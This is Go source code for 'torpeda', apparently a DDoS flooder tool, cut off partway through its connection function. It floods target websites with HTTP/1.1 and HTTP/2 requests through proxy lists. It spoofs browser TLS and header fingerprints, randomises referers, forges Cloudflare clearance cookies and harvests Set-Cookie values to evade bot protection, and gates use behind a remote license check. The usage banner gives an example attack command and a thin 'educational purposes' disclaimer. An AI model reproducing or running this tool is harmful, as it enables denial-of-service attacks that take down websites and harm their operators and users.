package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	http "github.com/bogdanfinn/fhttp"
	"github.com/bogdanfinn/fhttp/http2"
	"github.com/bogdanfinn/fhttp/cookiejar"
	tls "github.com/bogdanfinn/utls"
	"github.com/panjf2000/ants/v2"
	"h12.io/socks"
	
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
)

var (
	connections       int32
	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
	settingsFrame     = map[http2.SettingID]uint32{
		http2.SettingHeaderTableSize:   65536,
		http2.SettingEnablePush:        0,
		http2.SettingInitialWindowSize: 6291456,
		http2.SettingMaxHeaderListSize: 262144,
	}
	settingsFrameOrder = []http2.SettingID{
		http2.SettingHeaderTableSize,
		http2.SettingEnablePush,
		http2.SettingInitialWindowSize,
		http2.SettingMaxHeaderListSize,
	}
)

var supportedVersions = []uint16{
	0xfafa,
	tls.VersionTLS13,
	tls.VersionTLS12,
}
var cipherSuites = []uint16{
	0xCACA,
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
}

var supportedGroups = []tls.CurveID{
	tls.X25519,
	tls.CurveP256,
	tls.CurveP384,
}

var (
	reqmethod string
	target    string
	duration  int
	threads   int
	rps       float64
	proxies   = []string{}
	proxyFile string

	debug    bool
	extra    bool
	test     bool
	redirect bool
	parsed   bool
	cf       bool
	useJar	 bool
	useDelay bool
	randRate bool
	useHTTP2 bool

	cookies         = ""
	timeoutCount    int
	refererURL      string
	customCookie    string
	customUserAgent string
	httpMode	    string

	connectionFlow   = uint32(15663105)
	statusMutex      sync.Mutex
	statusMap        = make(map[int]int)
	customHeaders    = make(map[string]string)
	licenseVerified  = false
	paths            []string
	currentPathIndex int32
	mu               sync.Mutex    
	proxyUserAgentMap = make(map[string]http.Header)
 	proxyMapMutex sync.Mutex

	blockedDomains = []string{".gov", ".by",  ".edu", ".int", ".mil"}

	randomReferers = []string{
		"https://www.google.com",
		"https://bing.com",
		"https://yahoo.com",
		"https://duckduckgo.com",
		"https://youtube.com",
		"https://vk.com",
		"https://x.com",
		"https://github.com",
		"https://dzen.ru",
		"https://instagram.com",
		"https://tiktok.com",
		"https://wikipedia.org",
		"https://chatgpt.com",
		"https://reddit.com",
		"https://amazon.com",
	}
)

const licenseURL = "https://raw.githubusercontent.com/Pxttern/license-for-torpeda/main/license"
const requiredLicense = "1337"

func checkLicense() {
	if licenseVerified {
		return
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		ForceAttemptHTTP2: false,
	}
	client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: tr,
	}

	resp, err := client.Get(licenseURL)
	if err != nil {
		fmt.Println("[#8] Whoops something went wrong pm @rapidreset")
		os.Exit(1)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}

	if strings.TrimSpace(string(body)) != requiredLicense {
		fmt.Println("[#9] Whoops something went wrong pm @rapidreset")
		os.Exit(1)
	}

	licenseVerified = true
	fmt.Println("\033[32mlicense is valid\033[0m")
}

func isBlockedDomain(target string) bool {
	parsedURL, err := url.Parse(target)
	if err != nil {
		os.Exit(1)
	}

	for _, domain := range blockedDomains {
		if strings.HasSuffix(parsedURL.Hostname(), domain) {
			return true
		}
	}
	return false
}

func main() {
	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
	if len(os.Args) < 7 {
		fmt.Print("\033[H\033[2J")
		fmt.Println(`	[flooder - golang] torpeda v0.9 // Updated: 22.11.2024 // Made with love :D
	Developers to method: @rapidreset aka mitigations / helped @benshii
	WARNING: The method was done for educational purposes, all responsibility is on you!
	Annoucement: @devtorpeda / @rapidreset
	Features: many options, multi user-agents, support %RAND% in target, support rate like 4.7, support http/socks proxy
	How to use & example:

	go run h2pivo.go <reqmethod> <target> <time> <threads> <ratelimit> <proxyfile>
	go run h2pivo.go GET "https://target.com" 120 16 128 proxy.txt

	Options:
	--debug - For display status ur codes from proxies (recommend / maybe low rps to use more resource)
	--extra - For additional headers (recommend)
	--test - For display html content with proxy
	--redirect - For sites who has redirect system using status codes like: 301, 302, 307, 308 
	--parsed - For sites that use Set-cookie for protection (recommend)
	--cookie "<string>" - For custom cookie and also cookie support %RAND% ex: "pizdec=%RAND%"
	--header "<string>" - For custom headers split each header with # ex: "f:f" or "f:f#f1:f1"
	--referer "<string> or rand" - For custom referer ex: "https://www.google.com" (recommend rand)
	--ua "<string>" - For custom useragent ex: "curl/4.0"
	--cf - For sites who has protection based on check cf_clearence cookies
	--http1 - For sites who have only http/1.1 
	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
	--randrate - beta test
	--randpath - beta test
	--jar - beta test
	--delay - beta test
	 `)
	return
}

	reqmethod = os.Args[1]
	target = os.Args[2]
	duration, _ = strconv.Atoi(os.Args[3])
	threads, _ = strconv.Atoi(os.Args[4])
	rps, _ = strconv.ParseFloat(os.Args[5], 64)
	proxyFile = os.Args[6]

	if !contains(validMethods, reqmethod) {
		fmt.Println("[#1] Request method can only GET/HEAD/POST/PUT/DELETE/CONNECT/OPTIONS/TRACE/PATCH")
		os.Exit(1)
	}

	if isBlockedDomain(target) {
		fmt.Println("[#2] This target in blacklist if this mistake pm @rapidreset")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "https://") && !strings.HasPrefix(target, "http://") {
		fmt.Println("[#3] Target must start with https:// or http://")
		os.Exit(1)
	}

	if duration < 1 || duration > 86400 {
		fmt.Println("[#4] Time must be between 1 and 86400 seconds")
		os.Exit(1)
	}

	if threads < 1 || threads > 512 {
		fmt.Println("[#5] Threads must be between 1 and 512")
		os.Exit(1)
	}

	if rps < 0.1 || rps > 128 {
		fmt.Println("[#6] Ratelimit must be between 0.1 and 128")
		os.Exit(1)
	}
	paths = []string{""}
	for i := 0; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--debug":
			debug = true
		case "--extra":
			extra = true
		case "--test":
			test = true
		case "--redirect":
			redirect = true
		case "--parsed":
			parsed = true
		case "--header":
			if i+1 < len(os.Args) {
				parseCustomHeaders(os.Args[i+1])
			}
		case "--ua":
			if i+1 < len(os.Args) {
				customUserAgent = os.Args[i+1]
			}
		case "--referer":
			if i+1 < len(os.Args) {
				refererURL = os.Args[i+1]
			}
		case "--cookie":
			if i+1 < len(os.Args) {
				customCookie = os.Args[i+1]
			}
		case "--multipath":
			if i+1 < len(os.Args) {
				paths = strings.Split(os.Args[i+1], "@")
			}
		case "--http":
			if i+1 < len(os.Args) {
				httpMode = os.Args[i+1]
			}
		case "--randrate":
			randRate = true
		case "--delay":
			useDelay = true
		case "--jar":
			useJar = true
		}
	}

	if randRate {
		rand.Seed(time.Now().UnixNano())
		rps = float64(rand.Intn(60) + 1)
	}

	checkLicense()

	readProxies()

	fmt.Println("Attack started!")

	if debug {
		go printStatuses()
	}

	p, _ := ants.NewPool(threads)
	defer p.Release()

	 for i := 0; i < threads; i++ {
 
  	  p.Submit(func() {
     	   for _, proxy := range proxies {
      	      go start(proxy)
    	    }
 	   })
	}

	time.Sleep(time.Duration(duration) * time.Second)
}


func detectProxyType(proxy string) string {
	if strings.HasPrefix(proxy, "socks5://") {
		return "socks5"
	} else if strings.HasPrefix(proxy, "socks4://") {
		return "socks4"
	} else if strings.HasPrefix(proxy, "https://") {
		return "https"
	} else if strings.HasPrefix(proxy, "http://") {
		return "http"
	}

	return "http"
}

func parseCustomHeaders(headers string) {
	headerPairs := strings.Split(headers, "#")
	for _, pair := range headerPairs {
		parts := strings.SplitN(pair, ":", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			if key != "" && value != "" {
				customHeaders[key] = value
			}
		}
	}
}

func randstr(length int) string {
	const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var result strings.Builder
	charactersLength := len(characters)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < length; i++ {
		randomIndex := rand.Intn(charactersLength)
		result.WriteByte(characters[randomIndex])
	}

	return result.String()
}

func timestampString() string {
	return strconv.FormatInt(time.Now().Unix(), 10)
}

func Cloudflarecookie() string {
	cookieValue := fmt.Sprintf(`cf_clearance=%s.%s-%s-1.2.1.1-%s.%s.%s_%s_%s_%s_%s.%s`,
		randstr(19),
		randstr(23),
		timestampString(),
		randstr(108),
		randstr(21),
		randstr(11),
		randstr(12),
		randstr(201),
		randstr(6),
		randstr(20),
		randstr(20),
	)
	return cookieValue
}

func delayrandom() {
	if useDelay {
		sleepTime := time.Duration(rand.Intn(3)+1) * time.Second
		time.Sleep(sleepTime)
	}
}

func parseCookies(resp *http.Response) {
	uniqueCookies := make(map[string]string)

	setCookies := resp.Header["Set-Cookie"]
	if len(setCookies) > 0 {
		for _, cookie := range setCookies {
			cookieParts := strings.Split(cookie, ";")[0]
			cookieName := strings.Split(cookieParts, "=")[0]

			if _, exists := uniqueCookies[cookieName]; !exists {
				uniqueCookies[cookieName] = cookieParts
			}
		}

		cookies = ""
		for _, cookieValue := range uniqueCookies {
			if cookies == "" {
				cookies = cookieValue
			} else {
				cookies += "; " + cookieValue
			}
		}

		if debug {
			fmt.Println("Cookies: ", cookies)
		}
	}
}

func randomHeader(proxy string) http.Header {
	header := http.Header{}
	parsedURL, err := url.Parse(target)
	if err != nil {
		os.Exit(1)
	}
	domain := parsedURL.Host
	if httpMode == "1" {
        header = http.Header{
      	    "Host":                   	 []string{domain},
            "Connection":                []string{"keep-alive"},
            "Cache-Control":             []string{"max-age=0"},
            "sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
            "sec-ch-ua-mobile":          []string{"?0"},
            "sec-ch-ua-platform":        []string{`"Windows"`},
            "Upgrade-Insecure-Requests": []string{"1"},
			"User-Agent":                []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
            "Accept":                    []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
            "Sec-Fetch-Mode":            []string{"navigate"},
            "Sec-Fetch-User":            []string{"?1"},
            "Sec-Fetch-Dest":            []string{"document"},
            "Accept-Language":           []string{"en-US,en;q=0.7"},
            "Accept-Encoding":           []string{"gzip, deflate, br, zstd"},
        }
        header[http.HeaderOrderKey] = []string{
            "host",
            "connection",
            "cache-control",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "sec-ch-ua-platform",
            "upgrade-insecure-requests",
			"user-agent",
            "accept",
			"sec-fetch-site",
            "sec-fetch-mode",
            "sec-fetch-user",
            "sec-fetch-dest",
            "accept-encoding",
            "accept-language",
        }
    } else {
	browsers := []string{"winEdge", "winBrave", "winArc", "winOperaGX", "winYandex", "linuxBrave", "linuxOpera", "linuxBrave1", "macOpera", "macBrave", "macEdge"}
	rand.Seed(time.Now().UnixNano())
	browser := browsers[rand.Intn(len(browsers))]

	switch browser {
	case "macBrave":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Macos"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
			"sec-gpc":                 []string{"1"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "macEdge":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"macOS"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US,en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "macOpera":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Macos"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-gpc":                 []string{"1"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "winBrave":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Windows"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
			"sec-gpc":                 []string{"1"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"accept-language",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"priority",
		}
	case "winArc":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Windows"`},
			"dnt":                     []string{"1"},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US,en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"dnt",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "winEdge":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Windows"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US,en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "winOperaGX":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Windows"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US,en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "winYandex":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "YaBrowser";v="24.10", "Yowser";v="2.5"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Windows"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 YaBrowser/24.10.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	case "linuxBrave":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Linux"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
			"sec-gpc":                 []string{"1"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"accept-language",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"priority",
		}
	case "linuxBrave1":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Linux"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
			"sec-gpc":                 []string{"1"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"accept-language",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"priority",
		}
	case "linuxOpera":
		header = http.Header{
			"cache-control":           []string{"max-age=0"},
			"sec-ch-ua":               []string{`"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"`},
			"sec-ch-ua-mobile":        []string{"?0"},
			"sec-ch-ua-platform":      []string{`"Linux"`},
			"upgrade-insecure-requests": []string{"1"},
			"user-agent":              []string{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0"},
			"accept":                  []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			"sec-gpc":                 []string{"1"},
			"sec-fetch-mode":          []string{"navigate"},
			"sec-fetch-user":          []string{"?1"},
			"sec-fetch-dest":          []string{"document"},
			"accept-encoding":         []string{"gzip, deflate, br, zstd"},
			"accept-language":         []string{"en-US;en;q=0.9"},
			"priority":				   []string{"u=0, i"},
		}
		header[http.HeaderOrderKey] = []string{
			"cache-control",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform",
			"upgrade-insecure-requests",
			"user-agent",
			"accept",
			"sec-gpc",
			"sec-fetch-site",
			"sec-fetch-mode",
			"sec-fetch-user",
			"sec-fetch-dest",
			"accept-encoding",
			"accept-language",
			"priority",
		}
	}
}
	if refererURL == "rand" {
		rand.Seed(time.Now().UnixNano())
		header.Set("referer", randomReferers[rand.Intn(len(randomReferers))])
	} else if refererURL != "" {
		header.Set("referer", refererURL)
	}

	if refererURL == "" {
		header.Set("Sec-Fetch-Site", "none")
	} else {
		ref := []string{"same-site", "same-origin", "cross-site"}
		rand.Seed(time.Now().UnixNano())
		secFetchSite := ref[rand.Intn(len(ref))]
		header.Set("Sec-Fetch-Site", secFetchSite)
	}

	if extra {
		randomKey := "1pizdec" + randstr(5)
		header[randomKey] = []string{randstr(6)}
	}

	if extra {
		randomKey := "fwfw4" + randstr(6)
		header[randomKey] = []string{randstr(3)}
	}

	if reqmethod == "POST" {
		header.Set("content-length", "0")
		header.Set("content-type", "application/json")
	}

	if cf {
		cloudflareCookie := Cloudflarecookie()
		header.Set("Cookie", cloudflareCookie)
	}

	for key, value := range customHeaders {
		header.Set(key, value)
	}
	
	return header
}

func readProxies() {
	file, err := os.Open(proxyFile)
	if err != nil {
		log.Fatalf("[#6] Problem in proxyfile: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func processCustomCookie(cookie string) string {
	return strings.ReplaceAll(cookie, "%RAND%", randstr(10))
}

func getCurrentPath() string {
	index := atomic.AddInt32(&currentPathIndex, 1) - 1
	return paths[index%int32(len(paths))]
}

func start(proxy string) {
	proxyType := detectProxyType(proxy)

	if proxyType == "http" || proxyType == "https" {
		if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
			proxy = "http://" + proxy
		}
	}

	proxyClean := strings.TrimPrefix(proxy, proxyType+"://")

	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("Error parsing target URL:", err)
		return
	}

    if httpMode == "1" {
		useHTTP2 = false
	} else if httpMode == "2" {
		useHTTP2 = true
	} else if httpMode == "mix" {
		rand.Seed(time.Now().UnixNano())
		useHTTP2 = rand.Intn(2) == 0
	}
	
    tlsConfig := &tls.Config{
		ServerName: 			  parsedURL.Host,
		MinVersion:               supportedVersions[len(supportedVersions)-1],
		MaxVersion:               supportedVersions[0],
		CurvePreferences:         supportedGroups,
		CipherSuites:             cipherSuites,
		ClientSessionCache:       tls.NewLRUClientSessionCache(0),
		PreferServerCipherSuites: true,
		InsecureSkipVerify:       false,
    }

	if useHTTP2 {
		tlsConfig.NextProtos = []string{"h2", "http/1.1"}
	} else {
		tlsConfig.NextProtos = []string{"http/1.1"}
	}

	var transport *http.Transport
	if proxyType == "socks5" || proxyType == "socks4" {
		dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
